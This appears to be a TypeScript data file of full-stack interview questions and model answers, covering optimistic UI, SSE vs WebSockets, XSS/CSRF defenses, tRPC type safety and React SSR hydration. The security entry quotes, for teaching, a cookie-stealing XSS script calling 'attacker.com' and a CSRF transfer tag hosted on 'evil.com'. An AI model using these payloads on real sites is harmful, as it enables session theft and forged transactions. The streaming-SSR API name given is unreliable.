import { QuestionItem } from '../../types';

export const FULLSTACK_QUESTIONS: QuestionItem[] = [
  {
    id: 'fs-1',
    slug: 'optimistic-ui-updates-and-reconciliation',
    title: 'How do you architect robust Optimistic UI Updates with offline queuing and rollback on failure?',
    questionText: 'When building a collaborative or real-time application (like Trello or Slack), how do you instantly update the UI before the server responds, handle network loss, queue mutations, and roll back state if the server rejects the write?',
    category: 'Full Stack & Software Architecture',
    categoryId: 'fullstack',
    topicId: 'state-management',
    subtopicId: 'optimistic-updates',
    difficulty: 'Hard',
    questionType: 'Practical Trade-off Analysis',
    roleTarget: 'Full Stack Developer',
    roleIds: ['fullstack-dev', 'frontend-dev', 'senior-software-eng'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Implement optimistic UI updates with snapshot rollback, persistent client-side mutation queues (IndexedDB), and idempotent server reconciliation.',
    shortAnswer: 'Optimistic UI updates immediately reflect anticipated server state in the UI before network confirmation. A production-grade implementation requires four pillars: 1) Snapshotting previous state prior to mutation, 2) Applying temporary optimistic state with a unique client-generated UUID, 3) Queuing mutations in a persistent store (IndexedDB) for offline resilience with exponential backoff, and 4) Reconciling server response by swapping the client UUID with the server entity or rolling back to the snapshot with an error notification if the request fails (e.g., 409 Conflict, 422 Validation).',
    detailedAnswer: '1. **Why Optimistic UI Matters**:\n   Perceived latency is the single greatest determinant of user satisfaction. Waiting 300ms for a round-trip network response before moving a card or liking a post feels sluggish.\n\n2. **The 4-Stage Lifecycle**:\n   - **Snapshot**: Deep-clone or capture immutable reference to relevant state cache.\n   - **Optimistic Apply**: Immediately dispatch action or update cache with synthetic entity flagged with `isPending: true`.\n   - **Server Execution**: Perform mutation with an idempotency key (`Idempotency-Key: <uuid>`) in headers so retries never duplicate records.\n   - **Settle (Success or Revert)**: On 200 OK, merge canonical server timestamps/IDs. On 4xx/5xx failure, restore the snapshot, toast an actionable error, and trigger retry if transient (e.g. 503 or offline).\n\n3. **Handling Offline Queues**:\n   When `navigator.onLine === false`, serialize mutations into IndexedDB. When online event fires, drain queue FIFO with retry limits. If server supports CRDTs or operational transforms, merge concurrent edits.',
    codeExample: {
      language: 'typescript',
      code: `// TanStack Query / React Query Optimistic Update Pattern
import { useMutation, useQueryClient } from '@tanstack/react-query';

interface Task {
  id: string;
  title: string;
  completed: boolean;
}

export function useToggleTask() {
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: async ({ taskId, completed }: { taskId: string; completed: boolean }) => {
      const res = await fetch(\`/api/tasks/\${taskId}\`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ completed }),
      });
      if (!res.ok) throw new Error('Failed to update task');
      return res.json() as Promise<Task>;
    },
    // 1. When mutation is called, cancel outgoing refetches to avoid overwriting optimistic update
    onMutate: async ({ taskId, completed }) => {
      await queryClient.cancelQueries({ queryKey: ['tasks'] });

      // 2. Snapshot current state for rollback
      const previousTasks = queryClient.getQueryData<Task[]>(['tasks']);

      // 3. Optimistically update local query cache
      queryClient.setQueryData<Task[]>(['tasks'], (old = []) =>
        old.map(t => (t.id === taskId ? { ...t, completed } : t))
      );

      // Return context with snapshot
      return { previousTasks };
    },
    // 4. On error, roll back to previous snapshot
    onError: (err, newTodo, context) => {
      if (context?.previousTasks) {
        queryClient.setQueryData(['tasks'], context.previousTasks);
      }
    },
    // 5. Always refetch on settle to ensure exact server consistency
    onSettled: () => {
      queryClient.invalidateQueries({ queryKey: ['tasks'] });
    },
  });
}`,
      exampleInput: "User toggles task checkbox while offline or on high-latency 3G connection.",
      exampleOutput: "Checkbox checks immediately (<16ms). If server rejects with 403 Forbidden, checkbox unchecks and toast displays 'Permission denied'."
    },
    commonMistakes: [
      'Not canceling in-flight background query refetches before mutating, causing race conditions where stale data overwrites the optimistic update.',
      'Failing to capture a clean rollback snapshot before mutating cache.',
      'Generating transient non-UUID temporary keys that collide or cause component remounting issues upon server response.'
    ],
    realWorldUseCases: [
      'Slack message sending (message appears immediately with small clock icon until delivery confirmed).',
      'Trello/Jira Kanban board drag-and-drop card positioning.',
      'E-commerce wishlist or heart/like toggles.'
    ],
    tradeOffs: [
      'Optimistic updates significantly increase frontend complexity due to error handling and rollback states.',
      'Not suitable for high-risk financial transactions (e.g. stock purchases or money transfers) where authoritative balance verification is mandatory prior to visual confirmation.'
    ],
    followUpQuestions: [
      'How would you handle merge conflicts if two users optimistically edit the same document simultaneously?',
      'How does an Idempotency-Key header prevent double billing when a client retries a failed optimistic payment request?'
    ],
    relatedQuestionIds: ['fe-5', 'be-2', 'be-4'],
    relatedTopicIds: ['state-management', 'offline-first', 'rest-api'],
    prerequisiteTopicIds: ['async-await', 'react-hooks'],
    nextTopicIds: ['crdt', 'distributed-systems'],
    tags: ['Full Stack', 'Optimistic UI', 'React Query', 'Offline First', 'State Management'],
    keywords: ['optimistic update', 'tanstack query', 'rollback', 'snapshot', 'indexeddb', 'offline', 'reconciliation']
  },
  {
    id: 'fs-2',
    slug: 'websockets-vs-server-sent-events-sse',
    title: 'WebSockets vs Server-Sent Events (SSE) vs Long Polling: Architectural Trade-offs & Scaling',
    questionText: 'When building a real-time system (such as live financial tickers, chat apps, or AI streaming tokens), how do you choose between WebSockets, SSE, and Long Polling across scalability, firewalls, and protocols?',
    category: 'Full Stack & Software Architecture',
    categoryId: 'fullstack',
    topicId: 'realtime-systems',
    subtopicId: 'websockets-sse',
    difficulty: 'Medium',
    questionType: 'Practical Trade-off Analysis',
    roleTarget: 'Full Stack Developer',
    roleIds: ['fullstack-dev', 'backend-dev', 'frontend-dev'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Compare bidirectional WebSockets vs unidirectional HTTP-native Server-Sent Events (SSE) across reconnection, HTTP/2 multiplexing, proxies, and load balancers.',
    shortAnswer: 'WebSockets provide full-duplex, bidirectional TCP communication over a single long-lived connection, ideal for high-frequency two-way traffic like gaming and real-time collaborative editing. Server-Sent Events (SSE) provide unidirectional server-to-client streaming over standard HTTP/1.1 or HTTP/2, featuring built-in reconnection, automatic event IDs, and zero proxy/firewall friction, making it the superior architecture for dashboards, notification feeds, and LLM token streaming. Long polling is a legacy fallback with excessive header overhead and connection churn.',
    detailedAnswer: '1. **Protocol Differences**:\n   - **WebSockets (`ws://`, `wss://`)**: Starts as an HTTP `Upgrade: websocket` handshake, then switches to a raw binary/text framing protocol over TCP. Bypasses standard HTTP request-response semantics.\n   - **SSE (`text/event-stream`)**: Standard HTTP GET request that leaves the response stream open indefinitely. Uses standard HTTP/2 multiplexing, compression, and authentication.\n   - **Long Polling**: Client sends standard HTTP request; server holds connection open until data arrives or timeout, then client immediately opens a new connection.\n\n2. **Feature Comparison**:\n   - **Directionality**: WebSockets are Full-Duplex (client and server can talk simultaneously). SSE is Unidirectional (server-to-client only; client sends data via standard HTTP POSTs).\n   - **Reconnection**: SSE has native browser reconnection (`EventSource`) with `Last-Event-ID` tracking. WebSockets require manual heartbeat/ping-pong implementation in JS.\n   - **HTTP/2 Multiplexing**: SSE over HTTP/2 shares a single TCP connection with other page assets. WebSockets bypass HTTP/2 and require their own dedicated TCP connection per socket.\n   - **Corporate Proxies & Firewalls**: SSE looks like regular HTTP and effortlessly passes through corporate proxies and CDN edges (Cloudflare/Fastly). WebSockets are often blocked or severed by strict corporate firewalls.\n\n3. **LLM Token Streaming**: SSE is universally preferred for ChatGPT-style interfaces because the client only submits a prompt once (via POST) and the server streams tokens back progressively.',
    codeExample: {
      language: 'typescript',
      code: `// Backend: Node.js Express SSE Endpoint
app.get('/api/ai/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders(); // Flush headers to initiate SSE stream

  const tokens = ['InterviewIQ', ' uses', ' AI', ' to', ' master', ' interviews.'];
  let i = 0;

  const timer = setInterval(() => {
    if (i < tokens.length) {
      // Format must follow: "data: <content>\\n\\n"
      res.write(\`id: \${i}\\ndata: \${JSON.stringify({ token: tokens[i] })}\\n\\n\`);
      i++;
    } else {
      res.write('event: done\\ndata: [DONE]\\n\\n');
      clearInterval(timer);
      res.end();
    }
  }, 100);

  req.on('close', () => clearInterval(timer));
});

// Frontend: Consuming SSE with native Fetch + ReadableStream
async function consumeStream() {
  const response = await fetch('/api/ai/stream');
  const reader = response.body?.getReader();
  const decoder = new TextDecoder();

  while (true) {
    const { done, value } = await reader!.read();
    if (done) break;
    const chunk = decoder.decode(value);
    console.log('Stream chunk:', chunk);
  }
}`,
      exampleInput: "Frontend connects to AI streaming response endpoint.",
      exampleOutput: "Tokens stream progressively every 100ms without opening raw WebSockets or tearing down TCP sockets."
    },
    commonMistakes: [
      'Choosing WebSockets for simple notification or AI streaming pipelines where unidirectional SSE would eliminate proxy issues and custom reconnection logic.',
      'Hitting the browser HTTP/1.1 limit of 6 open SSE connections per domain by forgetting to enable HTTP/2.',
      'Forgetting to flush response headers in backend SSE routes, causing buffered reverse proxies (e.g. Nginx `proxy_buffering off;`) to withhold tokens until completion.'
    ],
    realWorldUseCases: [
      'OpenAI / Anthropic streaming completion APIs (SSE).',
      'Stock ticker and cryptocurrency real-time order books (WebSockets).',
      'Figma multi-cursor collaborative whiteboard (WebSockets).'
    ],
    tradeOffs: [
      'WebSockets have lower per-message overhead for rapid two-way messaging, but complicate load balancing and sticky sessions.',
      'SSE requires separate HTTP POST endpoints if the client needs to reply, but leverages standard HTTP caching, monitoring, and security tooling.'
    ],
    followUpQuestions: [
      'How does Nginx buffering affect Server-Sent Events, and what directive fixes it?',
      'How do you scale WebSockets horizontally across multiple server instances using Redis Pub/Sub?'
    ],
    relatedQuestionIds: ['be-4', 'ai-4', 'sd-1'],
    relatedTopicIds: ['realtime-systems', 'http-protocols', 'backend-dev'],
    prerequisiteTopicIds: ['http-fundamentals', 'promises-async'],
    nextTopicIds: ['distributed-systems', 'redis-pubsub'],
    tags: ['Full Stack', 'WebSockets', 'SSE', 'Real-Time', 'HTTP/2', 'Streaming'],
    keywords: ['websockets', 'sse', 'server sent events', 'long polling', 'realtime', 'streaming', 'eventsource']
  },
  {
    id: 'fs-3',
    slug: 'xss-vs-csrf-defenses-deep-dive',
    title: 'XSS vs CSRF Vulnerabilities: Modern Defense-in-Depth for Full Stack Applications',
    questionText: 'Explain the fundamental distinction between Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF). How do modern browsers, SameSite cookies, and Content Security Policies prevent them?',
    category: 'Full Stack & Software Architecture',
    categoryId: 'fullstack',
    topicId: 'web-security',
    subtopicId: 'xss-csrf',
    difficulty: 'Medium',
    questionType: 'Conceptual',
    roleTarget: 'Full Stack Developer',
    roleIds: ['fullstack-dev', 'software-engineer', 'application-security-eng'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Distinguish script injection (XSS) vs unauthorized command dispatch (CSRF). Master SameSite cookies, CSP headers, and anti-CSRF token verification.',
    shortAnswer: 'XSS (Cross-Site Scripting) exploits a user’s trust in a website by injecting malicious JavaScript into the browser (stealing tokens, reading DOM, logging keystrokes). CSRF (Cross-Site Request Forgery) exploits a website’s trust in a user’s browser by tricking the browser into sending authenticated requests to an application where the user is currently logged in. XSS is mitigated via contextual output encoding, DOMPurify, and strict Content Security Policy (CSP). CSRF is mitigated using `SameSite=Lax` or `Strict` cookies, custom anti-CSRF headers (`X-Requested-With` or Double-Submit Cookie pattern), and rejecting state-changing GET requests.',
    detailedAnswer: '1. **Cross-Site Scripting (XSS)**:\n   - **Stored XSS**: Attacker injects `<script>fetch("attacker.com?c="+document.cookie)</script>` into a database comment. When another user views the comment, the script executes in their browser session.\n   - **Reflected XSS**: Malicious script injected into query parameter (`?search=<script>...`) and rendered without sanitization.\n   - **DOM-based XSS**: Insecure client JS code writes directly to sink: `element.innerHTML = location.hash`.\n   - **Defenses**: Never use `dangerouslySetInnerHTML` without `DOMPurify.sanitize()`. Store sensitive JWTs in `httpOnly` cookies so JS cannot read them. Set HTTP header: `Content-Security-Policy: default-src \'self\'; script-src \'self\' https://trusted.cdn.com`.\n\n2. **Cross-Site Request Forgery (CSRF)**:\n   - Attacker hosts a site `evil.com` containing `<img src="https://bank.com/transfer?to=attacker&amount=1000">` or an automated hidden `<form>`. When victim visits `evil.com`, their browser automatically attaches ambient cookies for `bank.com` and dispatches the transfer.\n   - **Defenses**:\n     - Set cookie attribute `SameSite=Lax` (default in modern browsers) or `SameSite=Strict`. In `Lax`, cookies are only sent on top-level navigation, blocking cross-origin POSTs and iframes.\n     - **Synchronizer Token / Anti-CSRF Token**: Server embeds a cryptographically random token in the HTML session; client must return it in an `X-CSRF-Token` header. Because `evil.com` cannot read across origins due to CORS, it cannot attach the token.\n     - Require custom headers (`X-Requested-With: XMLHttpRequest`) which triggers a CORS preflight that `evil.com` will fail.',
    codeExample: {
      language: 'typescript',
      code: `// Secure Cookie Configuration in Express
res.cookie('session_token', token, {
  httpOnly: true,     // Prevents XSS scripts from reading document.cookie!
  secure: true,       // Only transmitted over encrypted HTTPS connections
  sameSite: 'lax',    // Prevents CSRF by withholding cookie on cross-site subrequests
  maxAge: 3600 * 1000 // 1 hour expiration
});

// React Sanitization Defense against DOM XSS
import DOMPurify from 'dompurify';

function SafeUserContent({ htmlContent }: { htmlContent: string }) {
  // Strips script tags, onerror payloads, and malicious javascript: URIs
  const cleanHtml = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'target'],
  });

  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}`,
      exampleInput: "User profile bio contains malicious '<img src=x onerror=alert(1)>'.",
      exampleOutput: "DOMPurify strips the malicious 'onerror' handler, rendering safely as '<img>' without code execution."
    },
    commonMistakes: [
      'Believing CORS protects against CSRF. CORS prevents the reading of response data, but the mutation request still reaches and executes on the server unless SameSite/anti-CSRF tokens are enforced.',
      'Storing authentication tokens in `localStorage` where any third-party npm dependency or XSS vulnerability can instantly exfiltrate them.',
      'Allowing state-changing mutations (like password resets or deletions) via HTTP GET requests.'
    ],
    realWorldUseCases: [
      'Banking portals requiring two-factor authorization and strict SameSite cookies for all wire transfers.',
      'Markdown text editors on GitHub/Reddit allowing safe formatting while sterilizing script execution.'
    ],
    tradeOffs: [
      '`SameSite=Strict` completely blocks cookies when navigating from external links (e.g. clicking a link in Slack opens the web app logged out until refresh), which is why `SameSite=Lax` is the preferred standard.'
    ],
    followUpQuestions: [
      'If an attacker achieves stored XSS on your domain, can they bypass your anti-CSRF protections?',
      'What is a CSP nonce and how does it prevent inline script execution?'
    ],
    relatedQuestionIds: ['be-2', 'fe-1', 'fe-6'],
    relatedTopicIds: ['web-security', 'backend-dev', 'authentication'],
    prerequisiteTopicIds: ['http-fundamentals', 'browser-internals'],
    nextTopicIds: ['owasp-top-10', 'cryptography'],
    tags: ['Full Stack', 'Security', 'XSS', 'CSRF', 'Cookies', 'CSP'],
    keywords: ['xss', 'csrf', 'samesite', 'httponly', 'content security policy', 'dompurify', 'security']
  },
  {
    id: 'fs-4',
    slug: 'end-to-end-type-safety-architecture',
    title: 'Architecting End-to-End Type Safety across Database, Backend, and Frontend',
    questionText: 'How do you design a full-stack TypeScript architecture where a schema change in your database automatically propagates compile-time type errors to your frontend React components?',
    category: 'Full Stack & Software Architecture',
    categoryId: 'fullstack',
    topicId: 'type-systems',
    subtopicId: 'end-to-end-typing',
    difficulty: 'Medium',
    questionType: 'Technical Architecture',
    roleTarget: 'Full Stack Developer',
    roleIds: ['fullstack-dev', 'senior-software-eng', 'typescript-dev'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Connect ORM schemas (Prisma/Drizzle), API contracts (tRPC or Zod OpenAPI), and frontend hooks (TanStack Query) into a single unified type system without code duplication.',
    shortAnswer: 'End-to-end type safety eliminates the fragile boundary between client and server by generating or sharing types directly across the stack. The modern gold standard leverages either: 1) tRPC in a TypeScript monorepo (where frontend client directly infers backend router types and Zod input validators without runtime code generation), or 2) Schema-first OpenAPI / GraphQL code generation (where backend schemas compile to OpenAPI JSON, generating typed TypeScript fetch clients via `openapi-typescript` or GraphQL Codegen). A database schema change in Drizzle/Prisma updates the API contract, instantly triggering TypeScript compilation errors in frontend components if fields are missing or misspelled.',
    detailedAnswer: '1. **The Problem of Schema Drift**:\n   Traditionally, backend developers write SQL or Prisma models, manually create JSON serializers, and frontend developers write separate TypeScript `interface User { ... }`. When a backend field changes from `name` to `fullName`, the frontend fails silently at runtime in production.\n\n2. **Architecture A: Monorepo + tRPC**:\n   - **Database layer**: Drizzle ORM defines tables with TypeScript types inferred via `createSelectSchema()`.\n   - **API layer**: tRPC routers define procedures using Zod schemas for runtime input validation: `z.object({ email: z.string().email() })`.\n   - **Client layer**: Frontend imports `type AppRouter` from the backend package. TanStack Query wrapper provides auto-completion: `trpc.user.getProfile.useQuery({ userId: "123" })`. No code generation step is needed; TypeScript resolves types across monorepo project references in real time.\n\n3. **Architecture B: Polyglot / Microservices (OpenAPI)**:\n   When backend is in Go or Python, generate an `openapi.json` specification. Use `openapi-typescript` in the frontend build pipeline to generate immutable TypeScript type definitions, consumed by type-safe fetchers like `openapi-fetch`.',
    codeExample: {
      language: 'typescript',
      code: `// Backend: tRPC Router with Drizzle + Zod
import { z } from 'zod';
import { initTRPC } from '@trpc/server';

const t = initTRPC.create();

export const appRouter = t.router({
  getUser: t.procedure
    .input(z.object({ id: z.string().uuid() }))
    .query(async ({ input }) => {
      // Inferred return type from database query
      const user = await db.query.users.findFirst({
        where: (u, { eq }) => eq(u.id, input.id),
      });
      return user; // { id: string; email: string; role: 'ADMIN' | 'USER'; }
    }),
});

export type AppRouter = typeof appRouter;

// -------------------------------------------------------------
// Frontend: React Component consuming AppRouter
import { createTRPCReact } from '@trpc/react-query';
import type { AppRouter } from '../server/routers/_app';

const trpc = createTRPCReact<AppRouter>();

export function UserProfile({ id }: { id: string }) {
  // TypeScript will error here if 'id' is not a valid UUID string
  const { data: user, isLoading } = trpc.getUser.useQuery({ id });

  if (isLoading) return <div>Loading...</div>;

  // TypeScript provides 100% autocomplete:
  // Typos like 'user.mail' trigger red squigglies during build!
  return <div>Welcome, {user?.email} ({user?.role})</div>;
}`,
      exampleInput: "Developer changes backend database field 'email' to 'primaryEmail'.",
      exampleOutput: "Frontend React build immediately fails at compile time: 'Property email does not exist on type User'."
    },
    commonMistakes: [
      'Using `any` or loose type assertions (`as unknown as User`) in fetch wrappers, which breaks the compiler safety chain.',
      'Treating compile-time TypeScript types as runtime validation (e.g. failing to use Zod/Valibot to parse external user HTTP payloads before processing).',
      'Exposing internal database models directly to the client without filtering out sensitive columns like password hashes or internal audit metadata.'
    ],
    realWorldUseCases: [
      'Next.js / Turborepo full-stack applications with tRPC.',
      'Stripe-style API development where OpenAPI specs generate 7+ client SDKs automatically.'
    ],
    tradeOffs: [
      'tRPC requires both frontend and backend to be in TypeScript, typically within a monorepo.',
      'OpenAPI code-generation adds a build-step artifact that must be synchronized in CI pipelines.'
    ],
    followUpQuestions: [
      'Why is runtime validation (like Zod) still necessary even if your frontend and backend share TypeScript types?',
      'How does Turborepo caching accelerate type-checking in large full-stack monorepos?'
    ],
    relatedQuestionIds: ['fe-7', 'be-1', 'be-2'],
    relatedTopicIds: ['type-systems', 'typescript-fundamentals', 'rest-api'],
    prerequisiteTopicIds: ['typescript-interfaces', 'generics'],
    nextTopicIds: ['monorepo-architecture', 'ci-cd-pipelines'],
    tags: ['Full Stack', 'TypeScript', 'tRPC', 'Zod', 'Type Safety', 'Drizzle'],
    keywords: ['trpc', 'zod', 'type safety', 'end-to-end', 'drizzle', 'openapi', 'monorepo']
  },
  {
    id: 'fs-5',
    slug: 'ssr-hydration-internals-and-streaming',
    title: 'Modern SSR Hydration: Streaming Suspense, Selective Hydration, and Mismatch Errors',
    questionText: 'Explain the internal mechanics of React Server-Side Rendering (SSR). What happens during hydration, what causes hydration mismatch errors, and how does React 18+ Streaming SSR with Suspense solve the bottleneck?',
    category: 'Full Stack & Software Architecture',
    categoryId: 'fullstack',
    topicId: 'server-rendering',
    subtopicId: 'hydration-streaming',
    difficulty: 'Hard',
    questionType: 'Conceptual',
    roleTarget: 'Full Stack Developer',
    roleIds: ['fullstack-dev', 'frontend-dev', 'software-architect'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Understand SSR HTML generation, client DOM attachment, hydration mismatches, and how React 18 pipeToNodeWritable enables progressive streaming.',
    shortAnswer: 'Server-Side Rendering (SSR) generates static HTML on the server and sends it to the browser for instant First Contentful Paint (FCP). Hydration is the client-side process where React boots up in the browser, reconstructs the virtual DOM, walks the existing server-rendered DOM nodes, and attaches JavaScript event listeners to make the page interactive. Hydration mismatches occur when server HTML diverges from initial client render (e.g. rendering `Date.now()`, `window.innerWidth`, or mismatched cookies). React 18 revolutionized this with Streaming SSR (`pipeToNodeWritable`) and Selective Hydration: wrapping components in `<Suspense>` streams HTML chunks as they resolve, allowing users to interact with completed parts of the page before the entire bundle or data query completes.',
    detailedAnswer: '1. **The Classic SSR Waterfall Problem**:\n   In traditional SSR (React 17 `renderToString`):\n   - Server must fetch ALL data for the entire page before sending a single byte of HTML.\n   - Client must download the entire JavaScript bundle before it can hydrate anything.\n   - React must hydrate the entire DOM tree in one synchronous pass before any button becomes clickable (Time to Interactive latency).\n\n2. **The Hydration Process**:\n   When `hydrateRoot(domNode, <App />)` runs, React compares the server-rendered HTML nodes against the JSX tree. If a mismatch is detected (e.g., server rendered "Good Morning" but client local time renders "Good Afternoon"), React logs an error and is forced to throw away that subtree, re-rendering it on the client and causing visual layout shifts (CLS).\n\n3. **React 18 Streaming SSR with Suspense**:\n   - Uses Node.js streams (`pipeToNodeWritable` / Web Streams `renderToReadableStream`).\n   - Header and navigation HTML are flushed immediately to the browser.\n   - Heavy components wrapped in `<Suspense fallback={<Skeleton />}>` allow the server to send the skeleton first, resolve slow database queries in parallel, and stream the resolved component HTML followed by an inline `<script>` tag that replaces the skeleton in place.\n   - **Selective Hydration**: React hydrates components as soon as their JS arrives. If a user clicks on an unhydrated component waiting in the queue, React prioritizes hydrating that exact component first over others.',
    codeExample: {
      language: 'typescript',
      code: `// Next.js App Router / React 18 Streaming SSR with Suspense
import { Suspense } from 'react';

// Slow asynchronous server component fetching database records
async function ProductReviews({ productId }: { productId: string }) {
  const reviews = await fetchReviewsSlowly(productId); // takes 1.5s
  return (
    <div className="reviews">
      <h3>Customer Reviews ({reviews.length})</h3>
      {reviews.map(r => <p key={r.id}>{r.comment}</p>)}
    </div>
  );
}

export default function ProductPage({ params }: { params: { id: string } }) {
  return (
    <main>
      {/* 1. This static content streams to the browser in <50ms */}
      <h1>Product Details</h1>
      <p>Instant description and specifications.</p>

      {/* 2. Suspense boundary prevents slow reviews from blocking page render */}
      <Suspense fallback={<div className="skeleton">Loading reviews...</div>}>
        <ProductReviews productId={params.id} />
      </Suspense>
    </main>
  );
}`,
      exampleInput: "User navigates to ProductPage with slow database connection.",
      exampleOutput: "Page title and specs display in 50ms with a skeleton. Once database resolves 1.5s later, reviews stream into the existing DOM without page refresh."
    },
    commonMistakes: [
      'Accessing `window`, `localStorage`, or `document` directly in component render bodies rather than inside `useEffect` or behind client-only wrappers.',
      'Formatting relative dates or timestamps directly in SSR without specifying a fixed timezone, leading to server (UTC) vs client (local) hydration mismatch warnings.',
      'Putting entire pages inside a single Suspense boundary instead of fine-grained boundaries around independent slow data fetches.'
    ],
    realWorldUseCases: [
      'E-commerce product pages streaming reviews and recommendations without delaying core product buy buttons.',
      'News portals and social feeds streaming user comments asynchronously.'
    ],
    tradeOffs: [
      'Streaming SSR requires hosting platforms that support HTTP chunked transfer encoding (Node.js servers or modern Edge runtimes), rather than static S3 buckets.',
      'Fine-grained Suspense boundaries require disciplined state modeling to prevent layout thrashing as chunks resolve.'
    ],
    followUpQuestions: [
      'What is the difference between React Server Components (RSC) and standard Server-Side Rendering (SSR)?',
      'How does React Server Components reduce client-side bundle size compared to traditional SSR?'
    ],
    relatedQuestionIds: ['fe-1', 'fe-4', 'fs-2'],
    relatedTopicIds: ['server-rendering', 'react-core', 'frontend-performance'],
    prerequisiteTopicIds: ['react-reconciliation', 'http-fundamentals'],
    nextTopicIds: ['react-server-components', 'edge-rendering'],
    tags: ['Full Stack', 'SSR', 'Hydration', 'React 18', 'Streaming', 'Suspense'],
    keywords: ['ssr', 'hydration', 'suspense', 'streaming ssr', 'selective hydration', 'react 18', 'mismatch']
  }
];
